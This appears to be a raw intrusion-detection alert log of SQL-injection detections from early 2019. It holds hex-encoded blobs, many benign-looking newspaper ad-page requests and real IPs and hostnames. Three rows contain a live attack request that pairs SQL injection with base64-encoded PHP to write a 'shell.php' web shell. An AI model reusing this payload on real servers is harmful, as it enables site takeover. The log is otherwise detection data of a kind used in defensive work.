326F6370D044BECD0293399E0E87EC2F357A907522526F6C9C917B676BCA82C579825A5D63C2339F6A40D33C42FF2461D036A94B236113A735F1F1E90A84BDF0988A10363C51DAAA96F5FCCFEAD3F7BBEFD001413B281F5DA4F981325A5F7F7A4BB765C1016F385A7E58F1EA8AFCCD66167C358B77DBC24A909A46701DE210812AF9B03068BDA837B7CA6E032F7AC52C9FDA6AABEDB050F7DD420219F02F63038234B4D680C8E5CDBF9E2E9914AF68231C0823DC7714B9846E7CA4BD68831E17482DC09FB663D5FDC56D316C27DF3DBD00B79295C9AC7850A0428852B98D18A38E116F621B6944C7B1102A23B410C969D6AEE22714897B3D49E8DB06737EB144B9332FDE6D0646AFE7446E66892C47FF7C90A85AFFEEF95421E1860EB916367D644ADDDB37E5917517B9B9265D33C7645C6E4759FC318817218DB9513EC796D6C627A51E5E193333EB424C7C19C6219167E6F142186436F755146D6F45A3CF1A9622C0F335021EDF60C3DD5F5A657F27E95864CE622EE28DB917C56E0DB73F4F3ED57D931AC5DF21FDA49B996B3371A30495EF74A5E8FBA975B51191A8DAA8D21F88886457EFD0CA61AE787E89D52671D4E1A4D8FAE8FDB0BF3AF851416A3B5D5437A418FBD45C9C4A0093962056C4955EBFE15FDF3ED6A13298052FD01A21BDDDDFC0CAD822219B1D6EE4
2019-01-21 10:07,219.255.150.198,182.162.96.253,443,SqlInjection, retInfo=E737CAD75DB6BA2D153EBF7BB5A277CC541356D1498446C973095CAE5C05975F81B1770EFB4715CC8055551D46FE67E29ED44BABE454B24938C89B8CA50670F921D947F318F13B6917F9BAA4EE24E70626B0AE2880C8189F465EC9BB2E3F0924DEA6E0797ACF64ED68BAE911F62FD8E0DC0EC55433AF429572616B2D7764D8E6993B02642858938016E117A5DA3107499AF1E3C8609B6E92204131F43E6AE87CC66E1B14DE1B102FA867632FCE6F57D575FCC20ACCFE924F4511E0B434AA1EAA08B83FCAFF8B808D2659F778BF11602C3B4C7CF666BA09789DA22BBA6E0618EE175890D13B7B623DCC782601360AFB1B6A68FEE12D727BEC3AC522C3A45B3C138835375C59EB4F76BB7CE7653882916880D1AF286994A8700069E2B2EE63284C9901E6E865B3931A28484D2C2F51D579263E62DBD968E27A2F05EE0FCD96F743DA786D7A7FE21EEBC7C49EB08844C8CF19CFDEF0AE371485142BBD006613C94F432D120F97FA89EAAA6D1A01A4C4859A96906B75582CE89FB919219C9D67A0BC08160974FEA75807F16F222C64DC70C5D493E6CE5678FCD5F8824B607FFFA1D67C2AE455B0D15FE3DA323167F9286E7D3035E9DE42351E189918606ECF11AAE6CBCF6FC4721E4E7B5B009F2B189E76D9084344DC3DC7AF24EFAC0C76EC45C1A8B88560B77D0948CC9B7122CBD1B0F61BF8AE381A607157CC7D41D4B302FED20D9CBDD386B52F6452315E0F81B866E27C6CB4553CE6981CB59EBDA305235B3498A31BB0505EBFEF88B858948888C1B79A9C6ADEBDCE79B50239757EBF5735006CE76D56FE64CE1C4C4D358C32F2CC77DE5F17766841B6B75261282F83E39C05D75068C46E1243ADAEC5E62501157239387D661AE1093510DF9E5DB4867F75387DEDDF496FB5F9F346CF4635191B81FBA02988E7E64BE05BAEDDA9E58C4EA3CE1118E34C6341C664A0E5AD3F24E1864B6388B94474B16C6813206754FAB97322D4FF440683FA711E264B60CAEB060C5D2452763ED652FED8C9112262E3DB20846055E3F56AAEC4D2CEBEE468A66EA724F8C67F0885900B64F62F7F6600B0A70E48BCCEF1104614562D8FDE0BF8E7038B16AC068DD1CDA6A84FD6DCA41EEC43184B4BC33467EAC36102D7A0F4E2942CB05255F0CB3135925F581C7B90624E0B83BA11E58DB42A8BFD86B17B29FB1BF36202339063812FF269F0E30FC615C250472CF2022F374614D6233B81893EE9CC
2019-02-07 7:13,152.99.89.57,182.162.96.253,443,SqlInjection, retInfo=E75C93D96AE0B5AC6E23C51891238312D55E2922B5A445FB7F6EF701786D544829ADD7D4BCBFB184DECA3E5A794502D8EF5752EA21F19696464A8D58B802003B2BCA377A05C765069EC6298F09B9D8D83480633FBF6B8D5378ACAB56CEE9284F06366505EA198B12AF9A2E123D7ADE6C0000B7211CD5ED1DA41E9C2FA1504196BD9780FE2CD118CF5E55807133EA164B94CF9DE808B6DCF26EA3AE91B8F42E21634CA998632093A71A570027CB09BA3836DD8CC0CE2D9503DF63581F2709BC47CF6C1062CA55CA3AF49CA2089E7231E677C207144A81285BE1F63315DA4B4B0C3B37FB8F82F6DC38A8C0AC54AAFC9667CD0909785DA9D325314D4A3495054D477C635B7524118C89DC4D3A7FA8D2C3ADB81AB8D522F9AD688DD3C5CECB502487632C78AF9998CD0DD255F31FF816A7B85A8B6DB1EE9A004D3E189076F741A306FA328536D6ED89FF4CBA6065C55A915B1EC32F20A90781DE9686AC828D456F3DB2BBAF5825EBB96A72FD799494C1B679E3D1FFAA90466F9640F00714A2E9BA44B2FEBD0ED2294630B2414CB680B81415FC92E5C6A6A76045F3CDF4AF2B2BF66E5BAE8B798516E00B7ABFF88B8D8A090149AED51A0C5AD2C591B99E7B23B89D222546D0BB717CC9E3F1A34EB651AE4ADEB41A730260474CEB052E03FE9E3B291556A2D544B7170B8D3FEBE04DB1DC04B700D56D1AC360505C9DD240C60945314D53F8D77320E776D62FED2FD082E92C05A43A0BDA25EAD71EC6CE51C0B0A3633CA72DE4DE7A2789B78BAD909FAA35A5EF316900EA7035E7081A17E7059ABE78BFF5336D37085EE44E41D6C654FBB0AA60BCE8CF1B27AA8BD52F30CAF4C1CCCCA5AE9A3A4F12998EEA47A7EBE1ED03DBC52FA1A39482FA60F53911BFA17D6B2E785B8837444EAB58B2EE7533711B7BB4B103CE4AB5996D8D252551F21223A4290263F31166A6B74BA80F1F531981F38FA2634F40E9821A6478251B44186FFA46785B096BB76BDB3DD30C6A87B40AE6FFA8699111043FB57F604FAF030FC7543CDA9597FA8255DDA24C024EA1B958A8CB31A893326B8BDAF5C92E55FF1E2695491933E5BC2F47E78A89E9012273B9096A5FDC0C109ABEEFD0FDFF23C3D61849306438980C1309E9809520462E990D37792BC2543CA66AE8E1D2537978EFEB9377D9803E862EECFEDA849ADB5D14A72C17B62CF727883B4BF5EE4EB3CAF37F9DAB9DEE826C6AB69767C4961BB0C7EAFFD69E
2019-02-07 7:13,152.99.89.57,182.162.96.253,443,SqlInjection, retInfo=EE4E1CB233F0E64AF22BD990D42E9580A924606F7F5F00F27E96B3338F37F86294769185FA7E45D2A4FD1A346EF7D56000D1AD5556B07BBE9DA08ADEDE4B870F68B75CB7DBE82D626A687FEEE1A1B1D4F4CE020C79032F61E845A32FE3EDBCE1112782404C3A3DC6E2364B2F6A9818A92151E12CB1DD739991E604D298BAB390C0C3692F6B26BB3B66F03F8E59BADDCD0DAA626F966735463A1F8137E948737F56CE4489F08D925829AE39634A9D2DED8BC8B26BE75D3A68344849DB24A0CE8EA39EEE393F3C2B089123AC6CE705F2D48CC27174E34FB9031C807ED16006B2EE4FA8D86C9DC7B983B885F9615893BA76E93692EE697F6F8DAB83E1970C3F4F4FE27F07D2FC2459DFAA44FD92E2FC0CD6BE9A77682D86E54B5A087A1674F4842823214D8C351C6D7E07E158BA0F55CDCA14BD0F7BBF440AD55003EDDB1D7C0F80ADDEF953687C4905981D1DE1B9C58CF21DCE9B884E783A3592DE92AF0EE6BFB8D99A401CDDFC2BFE457BAB9A823B76EC82028E4D41F5A6E49B7EA4738790B45F725956FA7DEA792ADE322FB3F0424CB5CC23AEC8EC2A38CD1E6AA2D826F05F4C1B314373BA36A29B2D8CF184A7AC0C98DB9E6B9B4AC442F3FED8BB54B47804AC4003BCC402407FD9E1CB6283382A703930865B75E5114C5FD3454F53153A7CD713EB62FB54AB8888364BD7FE5BE44DA78402129F3D120567BAB90CE02822A41DA887F050CCCEEF4658ADF239559F4F68E4F71726837A565D52C606B5C53943A2C1DEAFF4E265F029940F00D6AA1987AD635EEF9FDC68A762C1B47AF42E9ECD0B7B3266A4DDCC1FE3BFE78A4B09BE92AA573262CF716263D2FA8696C7E07D8CA0E8A73D182DDF99D6ED39116BD170D5F0F9162E1241BD09389244FF59274E248952F6998CA551783B03F76D4405F2AA15E19B6E34A6739B0D5A11B0893E5F2DFE68D9C604D2D1D9CF6C23B6A698111299C4C7A5ADF97D6D472F7EA9CA57E32E580428D447BCA8492F1DEAFA57A403FE02E358D01B0A300AB97F2C079FFBBD6F19E52DE40F6578EA26BB08CDFC47DB2521E3EC63954E4E43E4B807A66A059B407147AC612CAC15F30685315FE097A72E277088D8B604771EA3E03788AE7B41DFB855835C9F1DE6B78E22A2CFC6C4676EEF199011DD804D1C6838CD5DEF254A597903A1EBAAFCE862560C16BA968373B0C04B97BCC3967C35A50E9606651B8F5AB64D2B5CC8E2D1E59BD3DAA644A794173BE
2019-01-30 18:58,223.38.21.161,182.162.96.253,443,SqlInjection, retInfo=F52447EB9B4EB8F3229BB397F6D65009D9F28EE244332D84CFECF630D78251EDBE079B00478BA7E1588091322116482DFD71AF99B16E208145BB46BA06B7835552CF7BD72009F04FCFD61447023FB3BED38423D08EFA1FBBA072B9A9F254CD063606393D505FE29EE371C33B8D619DA7B6BFFDD7731D450F02157901047BE3CD6F33BF45DEB42520640FB8B735865E62AA46F26D38E41D8AA1F7BE495382188384849BADACFA06D49759BBCE49AB29E9C664A6D977793DA0F3F3E67B12E32CC4EC60A3F6F86E1633BA00A499F89BA3050112920FEFD0EE7888409DFC106B2A561B69114F9161B5BC9A996CAC7C5FF33BA225003C15DC93F3DDA935E5C4C4100F3B8FA3E1BE9091407AEE72FC89014C42812A47DFD43372A9D2E349185ECB912A4BE2ADF012BEDADB694671A9CA86B96D7B7B6D472DAD73E98F974C68B51CD3C2BCF1B575322E750BA9DCACF403006F462CEE1FF6D0222A0640FF3AB52E4A8EDDB6887868AC965845B2687314593B35836E0BF45500A0A29D7C6E96819BAF8963E5D2372563E5B6FC8DE6D18CC26F258A0A30B4AEC2A9E7D7D07F56940FF2C7C814B5CAFDA03722AACD477216028AACA7FC0AF8145F0D66F35B626E69EF354A2D0CF04DA60D8BF952D58D6567307C4E38CFF78DE16BA3F91740D3ED3C54E994C0F1DD3F5AB3B44E4D23A5ADBC8132F86848A9DDB5DA24B42748BC1393C3E4F001B7EFF7EB4DCA60F667BC5ADDA4CDBD60FB7BC89EA79B99980EEF1D8197F2A29F18DB0F86191A5488F445D38F35E4582C472F3ADEB870AA763AD8C251ECD198192A377FAA1BD13C8DC80EB2C7634430DD915A070EE88A216CAADCBB7754B9DF21AAFF83B1252107679E3B849D8E70555CA0030507A26FB6BB59633EE71F1C2A53DCC5401303575702B1D38B90732106A4BA39EA57E8D49E356D831314DC2573E84D4F0738D81E9F181309BBD00F77AA40B551A92343668D17362DAA618D4B98CF12F8ADF7BACFF53F48F6243796D443390DDCB7B8BD77E4609395126CFD101A219AB4E171A634B8F2E9593971F6565CE86411A023A81B9B365071D5291B257334C6C145FDB461A783255E5624A58A0ED2F7EFDBD46DB89FE22737FEB2266F30BEBFA1ABA8D9EBFB90CF2EB6614D2C1E50EEBC8454CBFA1389DA5EE401CA667FBD4230C2E371CB3A9CA1ED84A14240BA0DCA40749D29CB55CC6C29A94FBF767B36012FA96834005E730A52535EBD1CD184
2019-01-23 22:09,223.62.163.96,182.162.96.253,443,SqlInjection, retInfo=FA9FBE6BBB64EB8C86B4E4C3A46B1DB6AF4FC22B56B2039508DBDA3E52EAE1218CBA0F8639305A56E9ED57391BD250747C070DFD738B5F7290AA994244B450010B43D019C152AF25A2A04770AFDC0909F8A3AFE3CE91494187711011B3D617CAEE1EA7B777D4B810A053AB3BDF1E3D7E5A4114DDAE3BB4CD09D0C4FD1E0886CFDB9A63393673F1563E8A782148561585F8E9EE5848013805D8E63DC29E2AE37A617BFE7ABEEDDAF9BBFA27570D171FAE41D11247E151AFC99B61D9A16EFB6E5CB51DC979A72F6331DC769C000E66139A06A61B391EB23176F3C2CAC86877AC88F72697390936280A54F19822F22A96281E44C441F1BF3F83697893896E40B6B45C3FC7675955220E2AA26524DD347949BA96F0152D4DD8D816E2E4552F760E1AC96DCB0160E999B6FB403FEFF470CF5486BC02A3F631C4BCC9A3D65EDE0D44BB0176129DE2F4186EEC814E76F86A1EFBECC53A75E7EF543D574D45612CABD6B72AE6FCCED7BEC5089443B10520327D1A92CC0F01FABD44055E7CE9AA74FCB8B37E1111D21AAEFEFD58F597E2DA7C0D6C13E5D0BD62815A709977AC2C8A16B4E05AF420051BBFE271CAC7E8D0F89C6CFDD182AB6271F264ED0ACED55EC225141F28E5152E5C28FC09075EF23C28242FF3E03D29F3E36317E3AC07FE72052B87B6EEE584837310935E2890D1186A5AE78876C83998CCC2046CAF25F8CBE5F9DCCE068403657B9E5EFBF72888A2E57068333DB8345882752E515B37EDC7FD4E010561CDD561508965E18113A3E7074AB796CE275A3F696C03AD6CFC86A3BA7B89C61AD432F0323106C1C1F4966DA36F274BAF2B555979D2F9E397BB471E37900CEB0B6E5B5EE91C5A086230D70D4DB65C774DFB4D19DB5CD6C86F77473A8BF68D5116A002370E24B78E510848A4DFC4D2A28F1D57FF1A10AEE59234BA899A92BC5C14A5BF3F173723484F6D4D31BA52DA460D6B737AA266FAC1356B845FC0C32F032D555822DCDD4491AA4CAD0995AE70513E40A5E58DC6CE20CBA9EE6E5BBE9AD4784EEC1FF8C5D4360499416E2F22706CE3BE5D17D1942024C84C65BF478E46361E54F79F002093BA2BE5E3161FA8D6395BFBDD21197F067D9EE4199098E0493D8BD52F9FA7BA469001E914E03C1D6A39CA4A30CCA03365BC3429796374B8F674F65ED4E692960CB81351768D445B9BF373836D3CADD0EAAAE9707F400E283672F3AC16F233E759729D88D66A7EAFF032
2019-02-19 10:11,121.145.75.99,182.162.96.253,443,SqlInjection, retInfo=FAC6AF9233093E2D12BF677895CE190B4B03C4EBA23DA6E00F19365FECEC94C3CA5D459B2C96B26E9E1E2DFF1D6CC407CC96C9D920E3993C8CCD15284C67AD8BBA38F12E41AA1FFB4CA07BF14D60E3C64D0340BEC5648FF4C254DEA62502A1384AE882A502504094B7022E49CDE822B73E97178382439A8FAFBA18378E6A75579CE82D1E8DCB69D6D7F2FE25C513FA8278E1F95FA90759D7FCDFFD63C8F440EB5015166E832274DFA93AF7D5C7558B703E7B7CD78007AD639F1101C3F8C81FE472A653A0547ABCB9C17DB1E7A06FE8B25C1424E25E380B9C0AD6BE9351D88DB05CEE0F95BD8190CF587383BD82F465DCE08771D01A3FF75993D6B2EA174FB214F9E1B342DF0A419775BA2FDC93F33E52CD8DDA6C974A1E59F00865B8A41C4A8027B9650E3FBF1AFAC7AD2CD9E3C22F24333E143733A821DA8533EF0669D0B057B54462C60EEE2F6E34D2277ECB44E6BB22301CF96A11D793B009AA341B58A92E4EFE7A389D1C0036F6F2BC892F66A951078D9A81A47BE29E2A524338E646FB8942522EC388414D141717F50FDFDA7A9D6F6FDBF8F16E3E517097DE75E8EA8BE7476D6700F9A884FC9C49E09129A6319A15822D5A6475B098A504606E4D48D012D3242975A0D32A4135F2B9DEA94B13B8803448A31E66027FD652C62EB30E0ED6F913136D32DE77CF4EDF563A7C709EF021884E3BCE37A123E55468FE1F909C7C52B250264C1993BA443714C09B9D80C0FC4F1B2569453A2C3BD7DD7FBDED07ED14319275373FDDA731A210FBCE08ADCA961A213A398B0C6A450427F87C328342405A23DD8E8F233DE78486C9C958F32FA5843BE7881E6597B898AD22240DD6A774E04E3417070DD349FDC823AC58BF4874EF16515E484AA2388A2A04997933AA108A02C9051B6CC607CD2E14500D416430ECB6C6D68D8F9FB49D9C7B094C5E0AA48D87B70B4E4426F2D7C06B5AE79B328EECC334D583AFF7429E1A2B6CF6152B96F71B9012B437890FC167C20DC2CCAF3E378BEB87836628E19A34DE965DFA2E1CA9888649FF59D6847062AB7B52382F93837BBCC7EB9E9D67DB634EBA9F72AC113E88928EB3322FBD1E2955C019CF901AF90D093F2525B1C9642724C8B26DCA3AEBF3E0208045851F106B27F4F6769D4BEEEDBB344C36F1B14D8F235B41D0FF99DC39B45579CC5353A1EE869B9CB431E2B20D5FBB827DFBAFE01A0FE99CBEB5BA1B2E3B759188B43871CC408A1C8
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/ad_google_mcloud_120X600.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: www.hankooki.com If-Modified-Since: Thu, 07 Dec 2017 00:44:03 GMT If-None-Match: ""24d-55fb55d5b8a09"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache2 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/ad_google_mcloud_120X600.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: www.hankooki.com If-Modified-Since: Thu, 07 Dec 2017 00:44:03 GMT If-None-Match: ""24d-55fb55d5b8a09"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache3 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/ad_google_mcloud_200X200.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: www.hankooki.com If-Modified-Since: Thu, 07 Dec 2017 01:04:26 GMT If-None-Match: ""253-55fb5a6431e6f"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache2 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/ad_google_mcloud_200X200.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: www.hankooki.com If-Modified-Since: Thu, 07 Dec 2017 01:04:26 GMT If-None-Match: ""253-55fb5a6431e6f"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache3 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/dh_ad_page_120600L.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Wed, 02 May 2018 01:17:52 GMT If-None-Match: ""3ca-56b2edb236817"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache1 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/dh_ad_page_120600L.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Wed, 02 May 2018 01:17:52 GMT If-None-Match: ""3ca-56b2edb236817"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache2 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/dh_ad_page_22050.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Fri, 18 Dec 2015 09:14:24 GMT If-None-Match: ""220-5272890cb3d82"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache2 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/dh_ad_page_22050.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Fri, 18 Dec 2015 09:14:24 GMT If-None-Match: ""220-5272890cb3d82"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache3 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/dh_ad_page_300250.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Wed, 19 Aug 2015 01:25:24 GMT If-None-Match: ""1d3-51d9fe8b524d0"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache1 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/dh_ad_page_300250.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Wed, 19 Aug 2015 01:25:24 GMT If-None-Match: ""1d3-51d9fe8b524d0"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache3 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/dh_ad_page_690100.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Fri, 05 Feb 2016 00:23:39 GMT If-None-Match: ""1d7-52afadce82146"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache1 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/dh_ad_page_690100.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Fri, 05 Feb 2016 00:23:39 GMT If-None-Match: ""1d7-52afadce82146"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache2 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/dh_ad_page_690100.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Fri, 05 Feb 2016 00:23:39 GMT If-None-Match: ""1d7-52afadce82146"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache3 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/po_ad_page_120160.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: www.hankooki.com If-Modified-Since: Wed, 16 Aug 2017 01:22:29 GMT If-None-Match: ""1f2-556d4babaad19"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache1 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /ad/po_ad_page_120160.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: www.hankooki.com If-Modified-Since: Wed, 16 Aug 2017 01:22:29 GMT If-None-Match: ""1f2-556d4babaad19"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache3 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection, GET /ad/worldcuptalk_ad_790480.php HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: hankooki.com X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache2 (Jaguar/3.0-11) Connection: Keep-Alive
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /js/v02/bottom_spon_v05.htm?wmcode=daily HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Tue, 31 Jul 2018 05:14:40 GMT If-None-Match: ""32b3-57244a7b435dc"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache2 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /js/v02/bottom_spon_v05.htm?wmcode=daily HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Tue, 31 Jul 2018 05:14:40 GMT If-None-Match: ""32b3-57244a7b435dc"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache3 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /js/v02/more.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Thu, 23 Aug 2018 04:34:58 GMT If-None-Match: ""2194-57412c81aeaa3"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache2 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /js/v02/more.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com If-Modified-Since: Thu, 23 Aug 2018 04:34:58 GMT If-None-Match: ""2194-57412c81aeaa3"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache3 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection, GET /lpage/society/201901/dh20190116235016137840.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache1 (Jaguar/3.0-11) Connection: Keep-Alive
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection, GET /lpage/society/201901/dh20190116235016137840.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache2 (Jaguar/3.0-11) Connection: Keep-Alive
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection, GET /lpage/society/201901/dh20190116235016137840.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: daily.hankooki.com X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache3 (Jaguar/3.0-11) Connection: Keep-Alive
2019-01-30 10:03,203.254.186.250,211.169.240.71,80,SqlInjection," GET /service/v01/multimedia_300.htm HTTP/1.0 User-Agent: Mozilla/5.0 like Gecko Host: eyenews.hankooki.com If-Modified-Since: Wed, 25 Jul 2018 02:20:03 GMT If-None-Match: ""12c2-571c9842edb9e"" X-Forwarded-For: 203.254.186.250 Via: 1.1 Cache1 (Jaguar/3.0-11) Connection: Keep-Alive"
2019-02-01 10:23,118.24.16.231,10.10.42.111,443,SqlInjection," GET /dsc HTTP/1.1 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Accept: */* Accept-Language: zh-cn Referer: http://www.dosimsenior.or.kr/crm/studio/modules/EntityRelease/release.php?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))} User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5) X-Forwarded-For: 239.35.7.219 Client-IP: 239.35.7.219 Host: 50plus.or.kr "
2019-02-01 10:23,118.24.16.231,10.10.42.111,443,SqlInjection," GET /dsc/index.do HTTP/1.1 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Accept: */* Accept-Language: zh-cn Referer: http://www.dosimsenior.or.kr/crm/studio/modules/EntityRelease/release.php?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))} User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5) X-Forwarded-For: 239.35.7.219 Client-IP: 239.35.7.219 Host: 50plus.or.kr "
2019-02-01 10:23,118.24.16.231,10.10.42.111,443,SqlInjection," GET /dsc?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))} HTTP/1.1 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Accept: */* Accept-Language: zh-cn Referer: http://www.dosimsenior.or.kr/crm/studio/modules/EntityRelease/release.php?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))} User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5) X-Forwarded-For: 239.35.7.219 Client-IP: 239.35.7.219 Host: 50plus.or.kr "
2019-02-17 21:31,125.56.218.42,172.19.3.203,80,PL_C_01_SQL Injection,"GET /index.php HTTP/1.1 index\=0000, lang\=Cn"
2019-02-09 8:32,23.210.215.132,172.19.3.212,80,PL_C_01_SQL Injection,"GET /index.php HTTP/1.1 lang\=Cn, index\=0000"
